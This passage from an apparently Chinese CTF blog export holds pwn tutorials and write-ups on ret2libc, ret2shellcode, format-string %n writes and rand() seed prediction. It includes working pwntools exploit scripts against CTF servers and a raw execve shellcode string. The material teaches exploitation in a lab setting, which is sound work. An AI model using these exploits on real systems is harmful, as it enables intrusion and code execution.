p64(r13) + p64(r14) + p64(r15)#三个参数的寄存器payload += p64(gagdet1_addr)#gadgets1的地址payload += &#x27;a&#x27; * 56#第二次pop 由于寄存器是啥数值我们已经不需要了 所以56个字节全部用垃圾数据覆盖payload += p64(last)#函数最后的返回地址 这里还有一点需要注意的 r12这里输入的地址应该是调用函数的got表地址 具体解释可以看HNCTF2022的一题wp if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"stack","slug":"stack","permalink":"http://example.com/categories/stack/"}],"tags":[]},{"title":"ret2libc","slug":"ret2libc","date":"2022-09-23T12:53:48.000Z","updated":"2023-09-14T17:20:30.000Z","comments":true,"path":"2022/09/23/ret2libc/","link":"","permalink":"http://example.com/2022/09/23/ret2libc/","excerpt":"","text":"前置知识了解随着我们做题的深入，我们会发现有些题目并不会给予我们后门函数，并且也没有ret2shellcode可以供我们存放shellcode的bss段变量 那么我们还有办法自己构建一个后门函数吗 不知道还记不记得在最开始的栈溢出那一题，我们提到了plt表和got表 在当时，为了照顾新手入坑pwn的感受，我们只是粗略的得出plt调用函数，got存真实地址的服务于做题的结论 现在，让我们解释一下这个结论的原因 我们先前已经讲过，got表的作用是因为动态链接的存在，为了使应用程序方便的获取libc中的真实地址 并且只有当程序运行和函数调用过后，got表中保存的才会是该函数的libc的绝对地址 而plt表虽然引用的也是got表中的真实地址，但是注意这里并不是说明got表能够调用这个函数 plt表之所以能够调用函数，而got不行的关键原因是因为plt表还起到了把控制(程序执行流)转移到对应的函数 当然上述的解释并不详细，许多原理性的问题没有讲到，如果将来想要死磕pwn的同学，建议花时间去专研透底层逻辑的问题(当然现在没有必要) 所以我们是不是可以得出一条逻辑链，当程序没有给予我们现成的后门函数的时候，我们可以通过system的plt表来调用system函数 但是说的容易做起来难，我们如何获得system函数的plt表地址呢？ 这里我们只需要记住一个公式 真实地址 &#x3D; 基址 + 偏移 即我们通过puts等函数泄露出来的函数地址是真实地址，我们可以通过计算偏移来求出libc基址 然后依据libc基址和偏移量得出其他函数的真实地址，从而随意调用 但是如果我们不了解libc版本，即题目附件并为给出呢 这里还需要了解一下libc中函数地址偏移的概念 如果开启了pie保护机制，函数的地址将在每次运行时发生变化 但是其后三位由于虚拟地址页的映射机制，将不会发生变化(前提是在同一个libc版本中) 因此，如果题目没有给予我们libc文件的话，我们可以通过函数的后三位来推演出libc版本，从而求得libc基址 wp演示 先看一下保护机制，但是看不出什么苗头 拖到ida里面看看 int __cdecl main(int argc, const char **argv, const char **envp)&#123; char s[32]; // [rsp+0h] [rbp-20h] BYREF init(argc, argv, envp); puts(&quot;Glad to meet you again!What u bring to me this time?&quot;); fgets(s, 96, stdin); puts(&quot;Ok.See you!&quot;); return 0;&#125; 有一个fgets输入任意字节的数据可以用来栈溢出，但是看了下函数列表，好像没有后门函数可以供我们返回 并且程序也没有提供给我们可以用来泄露函数地址的puts等 没办法了，我们只能连同puts函数泄露其真实地址一起构造 看到这里是不是仍然不太明白，看看exp的构造就知道了 1 from pwn import* 2 io = remote(&quot;node4.buuoj.cn&quot;,28548)3 elf = ELF(&quot;./pwn&quot;)4 libc = ELF(&quot;./libc-2.31.so&quot;)5 io.recvuntil(&quot;Glad to meet you again!What u bring to me this time?&quot;)6 puts_got = elf.got[&#x27;puts&#x27;]7 main_addr = elf.symbols[&#x27;main&#x27;]8 rdi_addr = 0x4007539 ret_addr = 0x40050e10 puts_got = elf.got[&#x27;puts&#x27;]11 puts_plt = elf.plt[&#x27;puts&#x27;]12 payload = cyclic(40)+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)13 io.sendline(payload)14 io.recvuntil(&quot;Ok.See you!&quot;)15 puts_addr = u64(io.recvuntil(&quot;\\nGlad to meet you again!What u bring to me this time?\\n&quot;,drop = True).ljust(8,b&#x27;\\x00&#x27;))16 libc_addr = puts_addr - libc.symbols[&#x27;puts&#x27;]17 system_addr = libc_addr + libc.symbols[&#x27;system&#x27;]18 binsh_addr = libc_addr + next(libc.search(b&#x27;/bin/sh&#x27;))19 payload = cyclic(40)+p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)20 io.sendline(payload)21 io.recvuntil(&quot;Ok.See you!&quot;)22 io.interactive() 第四行这里，我们之所以要装载题目附件所给我们的libc-2.31.so文件 是因为我们需要获取该libc版本的各函数相较于基址的偏移 同理，这里还有两种办法可以获取(实际上还有三种，但是最后一种我还不会用[截止到文章发布，如果后续学会了将会补上]) 获取libc版本偏移-第一种办法 在该网站 我们可以通过输入对应函数的后3位数值来检索对应的libc版本(比如图中检索到了3个版本，通常是都得试试的) libc database search (blukat.me) 获取libc版本偏移-第二种办法 libcsearch这个工具也能获取偏移 由于网上对于这个工具的安装和使用不计其数 这里我只负责介绍这个工具，安装过程如果出现问题可以看看这个博客(3条消息) LibcSearcher的安装使用_Catch_1t_AlunX的博客-CSDN博客 说回到exp，我们继续往下看，截止到12行的第一个payload都是一些前置的要点获取 cyclic生成40个字节的垃圾数据这个没有任何难度理解 rdi寄存器传参这条之前也解释过了，puts_got显然就是将puts函数的真实地址传给rdi 接下来的puts_plt便是调用puts函数，输出puts函数的真实地址 接着为什么要返回到main函数？因为我们还需要接收puts的真实地址，并且我们只能输入96个字节的数据，如果一次性构造payload过长则无法成功 第三个疑点来到了15行，有很多我们没有见过的语法？ u64，[-6:]，ljust？这些都是什么东西，一个一个讲 u64&#x2F;u32 不知道你还记不记得我们之前讲过的bite型，他起到了数据的传输和存储的作用 你是不是一直有个疑问，为什么我们要用到p64和p32 实际上p是将括号内的数据打包成二进制字节数据流(可以理解为bite型) 而如果我们要想接收，并且转化为我们能看懂的数据类型，就需要用到u 为了方便理解，我们看一下如果没有u64，我们得到的数据会是什么样子 其作用就是决定recv从倒数第n个字节开始读取 但是为什么这里是6呢？我们试试4，5，7这些数字会导致什么结果 这里不知道你发现没有，一个字节对应着两个字符(之前提过了，这里小复习一下) 并且由于小端序，所以我们从倒数第几个字节开始接收，影响着我们得到的真实地址的后三位 拜托，这可是致命的错误，后三位错了我们还怎么获得偏移 通常，函数的真实地址虽然是8字节(64位)，但是由于其头两个字节的数据恒为00 00 所以我们只需要从倒数第六字节开始读取(反而言之，就是你要从倒8处读也行) 欸 你说 我偏不要呢 我就不要[-6:]你来帮我限制读入的字节数量 反正我就8字节的地址呗 如果你尝试了以后就会报错，为什么？ 因为我们不单单只读入了函数的真实地址，数据传输以及内存地址分配是一个复杂的过程 而我们将其改为100试试，仍然可以正常读入数据 但是你会发现在地址结尾处多出来了个0a，实际上他是换行符，这个换行符是哪里来的？ 仔细观察14行 我们在接收的时候，并未一起接收换行符 这一点说明了什么?修改为100后都能读取倒上一个字符串的数据了，那我们刚刚不还说在函数地址上面，还有很多其他数据呢？ 这里就可以介绍介绍ljust了 ljust 他的作用就是限制我们读入的字节总数，如果不够的话则以我们设定好的字符填充 所以我们哪怕[-n:]中的n取到了100也仍然不会报错 说回exp 在第一个payload输送完以后，我们成功获得函数的真实地址 接着就是计算偏移然后求得其他函数以及binsh字符串的地址 还是老办法构造payload，并且这里还需要一个ret来栈对齐 补充：一点小补充吧 相信会有人和我有一样的疑问，在刚接触到ret2libc的时候 既然我们都将got表中的puts函数真实地址作为参数存储在了rdi寄存器中输送再接收 而且获取真实地址的方法只需要一个elf.got就行了 为什么我们不能直接拿这个地址来进行计算基址呢？ 很简单，我们debug看一下，如果我们直接使用got表中的真实地址，他是一个什么东西 我们再看一下 通过我们上文的办法得到的真实地址长什么样子 可以看到明显不一样 这是因为got表中保存的值是需要运行过后才会为真实地址，所以我们需要将其打印出来再接收(这里我也有点不太理解，埋个坑，日后填) if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"stack","slug":"stack","permalink":"http://example.com/categories/stack/"}],"tags":[]},{"title":"格式化字符串基础漏洞","slug":"格式化字符串基础漏洞","date":"2022-09-22T13:55:33.000Z","updated":"2023-09-15T02:55:22.000Z","comments":true,"path":"2022/09/22/格式化字符串基础漏洞/","link":"","permalink":"http://example.com/2022/09/22/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"格式化字符串漏洞原理printf应该是我们学习c语言起使用的最频繁的函数了 其语法我们熟悉的不能再熟悉了—&gt;printf (“格式化字符串”,参量… ) 我们可以写一段代码： #include &lt;stdio.h&gt;int main()&#123; int n=5; printf(&quot;%d&quot;,n); return 0;&#125; 当然我们也可以这样写： #include &lt;stdio.h&gt;int main()&#123; char a[]=&quot;chen&quot;; printf(a); return 0;&#125; 第二种写法虽然没有格式化字符但是仍然可以输出chen这个字符串 那我们再看看第三种写法 #include &lt;stdio.h&gt;int main()&#123; char a[]=&quot;%x%x%x&quot;; printf(a); return 0;&#125; 这次我们没有给printf函数参数，只是仅仅给他格式化字符，猜一下，这次能成功吗，如果成功了，会输出什么？ 输出了像地址的16进制？ 我们明明没有给他用以输出的参数，那么这串数据是从哪里来的？ 我们用图来表示一下printf输出的时候栈结构是什么样子 ps:关于这图，格式化字符串不一定要放在栈顶才能实现任意地址写入，注意别被误导了，下面会提一嘴 如果我们只传入了格式化字符串而没有传入参数 那么格式化字符串仍然会遵循着原先的逻辑，向高地址处逐个字长的输出当前栈的内容&#x2F;指针(输出的方式根据其格式化字符的不同而不同) 这是因为printf函数并不知道参数个数，它的内部有个指针，用来索检格式化字符串。对于特定类型%，就去取相应参数的值，直到索检到格式化字符串结束 pwn题中的格式化字符串通常有两种出法 第一种，使用格式化字符串泄露栈上的内容(canary或者是随机数不一定)，由于wp分类中的HUBU2022.fmt已经是这方面的例题了，这里不做额外的讲解，感兴趣的可以去wp分区中自行查看 第二种，也是难度较前者稍高，不好理解的一种 任意内存的读取及任意内存写入我们首先得了解一个不常用的格式化字符串**%n** 他的作用是将在其之前打印出来的字节数赋值给指定的变量 比如: AAAA%n 就会赋值4给变量 如果我们后面跟上要修改的变量地址，就可以做到任意地址的写入 没懂？没关系来看一道例题 开了canary保护，大概率是格式化字符串 看看ida int __cdecl main(int a1)&#123; unsigned int v1; // eax int result; // eax int fd; // [esp+0h] [ebp-84h] char nptr[16]; // [esp+4h] [ebp-80h] BYREF char buf[100]; // [esp+14h] [ebp-70h] BYREF unsigned int v6; // [esp+78h] [ebp-Ch] int *v7; // [esp+7Ch] [ebp-8h] v7 = &amp;a1; v6 = __readgsdword(0x14u); setvbuf(stdout, 0, 2, 0); v1 = time(0); srand(v1); fd = open(&quot;/dev/urandom&quot;, 0); read(fd, &amp;dword_804C044, 4u); printf(&quot;your name:&quot;); read(0, buf, 0x63u); printf(&quot;Hello,&quot;); printf(buf); printf(&quot;your passwd:&quot;); read(0, nptr, 0xFu); if ( atoi(nptr) == dword_804C044 ) &#123; puts(&quot;ok!!&quot;); system(&quot;/bin/sh&quot;); &#125; else &#123; puts(&quot;fail&quot;); &#125; result = 0; if ( __readgsdword(0x14u) != v6 ) sub_80493D0(); return result;&#125; 这里的&#x2F;dev&#x2F;urandom是什么？ 我们只需要了解他是linux系统中的随机伪设备，他的作用就是提供永不为空的随机字节流 浅看一下他生成的字节流长什么样子 说回这道题，看逻辑应该是要我们输入这个随机数，如果一样就调用system(&#x2F;bin&#x2F;sh) 而存放这个随机数的就是dword_804C044的地址 那我们这时候应该有两种想法，一种是泄露这个随机数，输入他 还有一种是通过修改这个随机数的值来判定成功 第一种办法本人是没法做出来，感兴趣的可以试一试 那么讲一下第二种办法，由上文的学习我们已经知道 要想用格式化字符串漏洞泄露栈上的内容，需要我们知道目标地址和格式化字符串存放的地址的偏移 用gdb看一下偏移 现在main函数处设置一个断点(这里由于main函数被删符号表了，所以b main的话gdb查找不到函数的，删符号表的体现就是在ida中main函数不是粗体字，ida只是凭借逻辑识别他为main函数) 接着运行并且跳转到输入字符串这边，我们先输入8个A看一下栈分布的情况 这里还是先解释一下x&#x2F;20wx $esp这个命令是什么意思 其作用是用gdb查看内存 格式: x &#x2F;n u f n是要显示的内存单元个数 f表示显示方式, 可取如下值 u表示一个地址单元的长度 这里的x&#x2F;20wx 的意思就是说查看20个4字节长度的内存单元 并且按16进制的格式显示 至于为什么是以esp为初始地址显示 是因为格式化字符串%n进行任意地址改写是在ESP所指向的地址处所指向的地址处写入数据(可以理解为栈顶) 所以我们需要知道当我们最终构造的payload中需要改写的地址内容距离esp的偏移是多少 而且也正是因为这一点，决定了我们可以不用一定要把格式化字符串放在栈顶 这里可以看到代表着AAAAAAAA的两个0x4141414141距离esp的偏移是10和11(如果我们只输入4个A只会占用偏移10这个字长，因为这是32位程序，等下编写exp的不要被搞晕了) 所以此时我们要如何构造我们的payload？ 此时我们将格式化字符放在payload的最后 from pwn import *io = remote(&quot;node4.buuoj.cn&quot;,25117)context.log_level = &quot;debug&quot;addr = 0x0804C044payload = p32(addr)+b&quot;%10$n&quot;io.sendline(payload)io.sendline(&quot;4&quot;)io.interactive() 由于此时程序是32位，%n前面传入的p32(addr)则为一个字长，四个字节，所以此时addr处的随机数就被我们修改为4 我们接着再输入4，就成功破解了随机数 学会了？觉得很简单？再来看一个比较绕的exp from pwn import *io = remote(&quot;node4.buuoj.cn&quot;,25117)context.log_level = &quot;debug&quot;addr = 0x0804C044payload = b&quot;AAAAAAA%13$n&quot;+p32(addr)io.sendline(payload)io.sendline(&quot;7&quot;)io.interactive() 这次我们把addr放在后面传输了，可以看到和上文的区别是前面多了7个A而且这次随机数被我们修改成7了 看不懂没关系，接下来详解 我们再次明确一下概念，这里提到的偏移指的是距离esp的字长数 那么我们要实现改写的是addr这个地址的随机数对吧 此时我们先传入的是字符串“AAAAAAA%13$n”他的字节数是多少？ 很明显是12个字节，也就是三个字长 我们之前通过gdb已经明白了，我们写入栈中的第一个字长是位于10偏移处，也就是AAAA 那么接下里的AAA%就会被写入11偏移 13$n就会被写入12偏移 而此时的addr就会被存放在13偏移处，所以此时我们的n就要从10更改为13 似乎有点能理解了是吧？ 实际上pwntools中有一个函数，他可以自动帮我们生成这样的payload，而我们要做到的只是给予他基本的参数 fmtstr_payload(offset, {addr: data}) offset就是我们需要更改内容的地址距离esp的偏移 addr就是我们需要改写内容的地址 data就是我们需要改写的数据 来看一下接下来的exp可以怎么写 from pwn import*io = remote(&quot;node4.buuoj.cn&quot;,25117)io.recvuntil(&quot;your name:&quot;)payload=fmtstr_payload(10,&#123;0x804C044:1&#125;)io.sendline(payload)io.recvuntil(&quot;your passwd:&quot;)io.sendline(&quot;1&quot;)io.recv()io.interactive() 可以看到，我们就这样轻易的将addr处的随机数更改为了1 是不是比之前的两种payload构造办法简单许多？ if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"stack","slug":"stack","permalink":"http://example.com/categories/stack/"}],"tags":[]},{"title":"Ret2shellcode","slug":"Ret2shellcode","date":"2022-09-21T08:37:21.000Z","updated":"2023-09-14T17:20:32.000Z","comments":true,"path":"2022/09/21/Ret2shellcode/","link":"","permalink":"http://example.com/2022/09/21/Ret2shellcode/","excerpt":"","text":"这次我们再来介绍一个栈的经典题型 在我们先前遇到的题目中，都有着出题人为我们提供的后门函数，如果没有后门函数，我们又该如何自己构建shellcode呢？ 带着这个疑问，我们开始今天的学习 如何写入system（&#x2F;bin&#x2F;sh）？由于题目通常都会开启NX保护，所以我们要想在栈中写入字符串是不现实的打算 我们好好想想，在内存块的五个分区中，还有哪个区块是可以为我们自由编辑的，这里我们想到了用来存储未初始化的全局变量区bss段 那么如何写入呢？ 我们先前已经知道了，计算机读不懂高级语言，即system(&#x2F;bin&#x2F;sh) 先前我们已经通过构造rop的方式用汇编语言指引执行流 这次我们尝试用机器码来将shellcode注入到内存中 常用的shellcode：”\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05” 这个shellcode只有23个字节，当题目的输入字长给的不够多的时候可以使用这个 当然还有第二种构造机器码的方式 shellcode &#x3D; asm(shellcraft.sh()) 但是你很快就会发现，为什么自己在32位情况下可以使用，但是64位下就不行 我们还需要在后面加上amd64才能使其输出64位的机器码 当然我们也可以通过**context.arch &#x3D; “amd64”**来使环境转化为64位，于是我们在接下来即使不用amd64也能输出64位机器码 例题解析这里以NewStarCTF 2022新生赛公开赛 的ret2shellcode作为例题讲解 老规矩看一下保护机制，NX开了，看来不能在栈上写入 ida看一下具体情况 int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4[40]; // [rsp+0h] [rbp-30h] BYREF void *buf; // [rsp+28h] [rbp-8h] init(argc, argv, envp); buf = mmap((void *)0x233000, 0x1000uLL, 7, 34, -1, 0LL); puts(&quot;Hello my friend.Any gift for me?&quot;); read(0, buf, 0x100uLL); puts(&quot;Anything else?&quot;); read(0, v4, 0x100uLL); puts(&quot;Ok.See you!&quot;); return 0;&#125; 出现了个mmap函数，用来干什么的？ 可以简单理解为 开辟一块空间存放我们输入的值 其地址为第一个参数addr(0x233000) 那么我们的目的就是将shellcode写入这块空间，然后在接下来的栈溢出中控制程序执行流到shellcode from pwn import*io = remote(&quot;node4.buuoj.cn&quot;,25533)shellcode = &quot;\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05&quot;io.recvuntil(&quot;Hello my friend.Any gift for me?&quot;)io.sendline(shellcode)io.recvuntil(&quot;Anything else?&quot;)payload = cyclic(56)+p64(0x233000)io.sendline(payload)io.recv()io.interactive() 其实本质上还是栈溢出控制程序执行流到后门函数，只不过这个后门函数是我们自己存入到程序中的，还是挺好理解的 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"stack","slug":"stack","permalink":"http://example.com/categories/stack/"}],"tags":[]},{"title":"pwn1_sctf_2016","slug":"pwn1-sctf-2016","date":"2022-09-19T12:00:48.000Z","updated":"2023-09-14T17:20:22.000Z","comments":true,"path":"2022/09/19/pwn1-sctf-2016/","link":"","permalink":"http://example.com/2022/09/19/pwn1-sctf-2016/","excerpt":"","text":"buuctf中的一题，纯纯烧杯题，这题注重考查c++逆向(但是我还是觉得是动手调试的能力) 老规矩了，checksec看一下保护机制和位数 感觉像是栈溢出，不确定，ida看看 哇，看到这函数列表懵逼了，不过别怕，仔细翻一番 逮到三个看名字有用的，f5看一下 main函数： int __cdecl main(int argc, const char **argv, const char **envp)&#123; vuln(); return 0;&#125; vuln函数： int vuln()&#123; const char *v0; // eax int v2; // [esp+4h] [ebp-54h] char s[32]; // [esp+1Ch] [ebp-3Ch] BYREF char v4[4]; // [esp+3Ch] [ebp-1Ch] BYREF char v5[7]; // [esp+40h] [ebp-18h] BYREF char v6; // [esp+47h] [ebp-11h] BYREF char v7[7]; // [esp+48h] [ebp-10h] BYREF char v8[5]; // [esp+4Fh] [ebp-9h] BYREF printf(&quot;Tell me something about yourself: &quot;); fgets(s, 32, edata); std::string::operator=(); std::allocator&lt;char&gt;::allocator(&amp;v6, s); std::string::string(v5, &quot;you&quot;, &amp;v6); std::allocator&lt;char&gt;::allocator(v8, v2); std::string::string(v7, &quot;I&quot;, v8); replace((std::string *)v4); std::string::operator=(&amp;input, v4, v7, v5); std::string::~string(v4); std::string::~string(v7); std::allocator&lt;char&gt;::~allocator(v8); std::string::~string(v5); std::allocator&lt;char&gt;::~allocator(&amp;v6); v0 = (const char *)std::string::c_str((std::string *)&amp;input); strcpy(s, v0); return printf(&quot;So, %s\\n&quot;, s);&#125; gatflag函数： int get_flag()&#123; return system(&quot;cat flag.txt&quot;); 看完人更傻了，虽然getflag明显就是要我们栈溢出，跳转到这个函数，但是vuln写的是什么？ 百度完应该是c++中std::string相关的用法 不过这题应该是要我们会用debug来调试程序 我们重点注意一下那一串天书里面的“I”和“you”，突破口肯定是这俩 浅写段exp，debug看看有什么玄机 from pwn import*io = remote(&quot;node4.buuoj.cn&quot;,29397)context.log_level = &quot;debug&quot; #这段就是打开debug，具体是什么，下面看到图你就知道了payload = b&#x27;I&#x27;*6io.sendline(payload)io.recv() 好家伙，我们可以看到明明传的是I，结果都变成了you，那到这里很明显了，这题就是把字符串中的i替换成了you 我们再来看看能不能进行栈溢出 可以看到，我们只能输入0x20字节的数据给s，但是他距离ebp有0x3c，不够怎么办？ 刚才不是输入I可以变成you吗？这不是一个字节顶三个字节，一节更比一节强（南孚打钱） 那思路很明显了，输入20个字长的I，就相当于输入了60个字长的you，我们就可以进行栈溢出了 exp: from pwn import*io = remote(&quot;node4.buuoj.cn&quot;,29397)getflag_addr = 0x8048f0dpayload = b&#x27;I&#x27;*20+cyclic(4)+p32(getflag_addr)io.sendline(payload)io.recv() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"HUBUCTF-新生赛-fmt","slug":"HUBUCTF-新生赛-fmt","date":"2022-09-18T05:21:44.000Z","updated":"2023-09-14T17:19:46.000Z","comments":true,"path":"2022/09/18/HUBUCTF-新生赛-fmt/","link":"","permalink":"http://example.com/2022/09/18/HUBUCTF-%E6%96%B0%E7%94%9F%E8%B5%9B-fmt/","excerpt":"","text":"老规矩走个流程，checksec看一下保护机制 好像看不出什么，猜不出他想干啥，拖到ida里面瞧瞧 int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; FILE *stream; // [rsp+8h] [rbp-68h] char format[32]; // [rsp+10h] [rbp-60h] BYREF char s[8]; // [rsp+30h] [rbp-40h] BYREF __int64 v6; // [rsp+38h] [rbp-38h] __int64 v7; // [rsp+40h] [rbp-30h] __int64 v8; // [rsp+48h] [rbp-28h] __int64 v9; // [rsp+50h] [rbp-20h] __int64 v10; // [rsp+58h] [rbp-18h] __int16 v11; // [rsp+60h] [rbp-10h] unsigned __int64 v12; // [rsp+68h] [rbp-8h] v12 = __readfsqword(0x28u); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); stream = fopen(&quot;flag.txt&quot;, &quot;r&quot;); *(_QWORD *)s = 0LL; v6 = 0LL; v7 = 0LL; v8 = 0LL; v9 = 0LL; v10 = 0LL; v11 = 0; if ( stream ) fgets(s, 50, stream); HIBYTE(v11) = 0; while ( 1 ) &#123; puts(&quot;Echo as a service&quot;); gets(format); printf(format); putchar(10); &#125;&#125; 经典格式化字符串漏洞吧 把flag.txt的内容存储在变量s里面，这题得用到gdb了 教一个办法，像这种调用文件的，建议自己在本地建一个同名文件，方便查看文件在栈中的地址 可以看到我们自己在本机创建的flag.txt此时位于栈上的位置 AAAAAAAA就是我们在gets中输入的值 所以我们可以知道flag和格式化字符串的偏移是11(有可能会有差错，所以我的建议是等下泄露flag的时候扩大范围多试几个) 为什么是11？AAAAAAAA不是和flag只间隔了3个字长？这里是64位和32位栈传参的差异 64位和32位栈传参我在初期栈学习中，就一直注重强调32位和64位的不同，因为我本人在初期学习中，就常常对这二者没有足够的分辨意识 接下来着重讲解这二者的不同 首先是我们之前已经详细讲过的32位传参 具体的传参方式就是在栈上传参，并且根据system和call system调用的不同，参数和函数地址的偏移也不同 我们在之前的阅读中，会注意到频繁出现的esp eip eax ebx等 这里的e就是32位特有，64位情况下的寄存器，通常是以r开头。例如rsp 64位传参的情况相较32位及其不同！！千万不要搞混 在linux操作系统中，前六个参数通过 RDI 、 RSI 、 RDX 、 RCX 、 R8 和 R9 传递 而在windows操作系统中，前四个参数通过 RCX 、 RDX 、 R8 和 R9 来传递 他们的共同点是，其第七个&#x2F;第五个参数就push入栈进行传递(因此上面的偏移值才是6+5[5是从AAAAAAAA开始数到flag]) 既然已经清楚了大致的偏移量，我们开始传入格式化字符串吧、 ​ 可以看到果然有些偏差，12才是正确的偏移量 这里又有一个问题了，为什么我们看到的是16进制形式的，而不是字符串形式 这就要从%x的用法着手分析了 x是打印出无0x的16进制 而我们换用%p试一下 转化成字符串看一下 7&#123;FTCSSN 倒过来，是不是像一个flag的格式了，说明这题就是用%p 这是为什么？%p和%x有什么区别？而且这里为什么又是倒转过来的？别急，慢慢讲 1.为什么这里要用%p%p是打印出所指栈位置中的地址指向的地方的内容 在搞懂这个问题前，我们得先知道，栈中是不会存储字符串的，这一点在栈溢出的时候就体现了出来 我们给system传参的时候是binsh字符串的地址，而不是binsh字符串 所以，看起来flag是存储到了栈中，其实只是他的地址被保存到了栈中 2.为什么是倒转过来的这里涉及到了小端序和大端序的问题 这二者都属于字节序，什么是字节序？为什么要有字节序？ 字节序指电脑内存中占用多个字节的数据的字节排列顺序 在几乎所有的平台上，多字节对象都被存储为连续的字节序列 为什么会有字节序，统一用大端序不行吗？答案是，计算机先处理低位字节，效率比较高，因为计算都是从低位开始的。所以，计算机的内部处理都是小端字节序。在计算机内部，小端序被广泛应用于现代 CPU 内部存储数据；而在其他场景，比如网络传输和文件存储则使用大端序。 那么什么是小端序和大端序？ 大端序将数据的低位字节存放在内存的高位地址，高位字节存放在低位地址 小端序将一个多位数的低位放在较小的地址处，高位放在较大的地址处 看不懂没关系，图文演示一下 上图为小端序的存储状况，作为高位字节的12就放在了低地址 而大端序的存储，就比较符合我们人类的阅读习惯 这里因为大端序我们接触的少，再加上小端序已经作了详细的解释，同理可得，就不进行作图了(真的不是我懒) 截止到现在，本题涉及到的知识点已经全部讲完了，如果想练练手的话，可以试试ctfshow中的pwn04(格式化字符串泄露canary) if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"HUBUCTF.新生赛.ez_pwn","slug":"HUBUCTF-新生赛-ez-pwn","date":"2022-09-17T14:27:18.000Z","updated":"2023-09-14T17:19:44.000Z","comments":true,"path":"2022/09/17/HUBUCTF-新生赛-ez-pwn/","link":"","permalink":"http://example.com/2022/09/17/HUBUCTF-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-pwn/","excerpt":"","text":"ps:本题思路由youlin师傅指引 checksec一下，查看一下保护机制 保护全开 64位？有点被吓到了 不过这种题估计都是flag已经准备好了或者自带shellcode 拖进ida看看 int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [rsp+4h] [rbp-8Ch] BYREF int i; // [rsp+8h] [rbp-88h] int v6; // [rsp+Ch] [rbp-84h] unsigned int seed[2]; // [rsp+10h] [rbp-80h] FILE *stream; // [rsp+18h] [rbp-78h] char v9[32]; // [rsp+20h] [rbp-70h] BYREF char s[8]; // [rsp+40h] [rbp-50h] BYREF __int64 v11; // [rsp+48h] [rbp-48h] __int64 v12; // [rsp+50h] [rbp-40h] __int64 v13; // [rsp+58h] [rbp-38h] __int64 v14; // [rsp+60h] [rbp-30h] __int64 v15; // [rsp+68h] [rbp-28h] __int64 v16; // [rsp+70h] [rbp-20h] __int64 v17; // [rsp+78h] [rbp-18h] unsigned __int64 v18; // [rsp+88h] [rbp-8h] v18 = __readfsqword(0x28u); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); *(_QWORD *)seed = time(0LL); *(_QWORD *)s = 0LL; v11 = 0LL; v12 = 0LL; v13 = 0LL; v14 = 0LL; v15 = 0LL; v16 = 0LL; v17 = 0LL; puts(&quot;Who goes there?&quot;); gets(v9); printf(&quot;Welcome to my challenge, %s. No one has ever succeeded before. Will you be the first?\\n&quot;, v9); srand(seed[0]); for ( i = 0; i &lt;= 99; ++i ) &#123; v6 = rand() % 100000 + 1; puts(&quot;I am thinking of a number from 1-100000. What is it?&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v4); if ( v6 != v4 ) &#123; puts(&quot;You have failed. Goodbye.&quot;); return 0; &#125; puts(&quot;Impressive.&quot;); &#125; puts(&quot;You&#x27;ve guessed all of my numbers. Here is your reward.&quot;); stream = fopen(&quot;flag.txt&quot;, &quot;r&quot;); if ( stream ) &#123; fgets(s, 50, stream); puts(s); &#125; puts(&quot;Goodbye.&quot;); return 0;&#125; 用时间做了种子，循环一百次，每次都随机一个数，我们需要输对这个数，算是经典的猜数字吧 一开始看到我们可以自定义赋值的v4和随机数v6是相邻的字节，所以想通过溢出来覆盖v6，使得if判断成立，不过貌似不行 所以还是正常做法吧 随机数，我目前知道的两种做法，一种是溢出数据覆盖seed，这样我们在知晓种子的值的情况下，因为c语言的rand是伪随机(下面就要降到了，我知道你很急，但你先别急)，所以就可以知道随机数的值 还有一种办法是本题将要使用到的，这道题我们可以发现他是用当前时间作为种子，来生成随机数，所以我们只要在exp中也是用当前时间作为种子，就可以得到一样的随机数（这里看不懂的话，是伪随机的概念不清楚） from pwn import *from ctypes import *io=remote(&quot;1.14.71.254&quot;,28056)libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)seed = libc.time(0)libc.srand(seed)io.sendlineafter(b&#x27;Who goes there?&#x27;, b&#x27;chen&#x27;)for i in range(100): buf = libc.rand() % 100000 + 1 io.sendlineafter(b&#x27;What is it?&#x27;, str(buf)) io.recvuntil(b&#x27;\\n&#x27;) 几个疑点 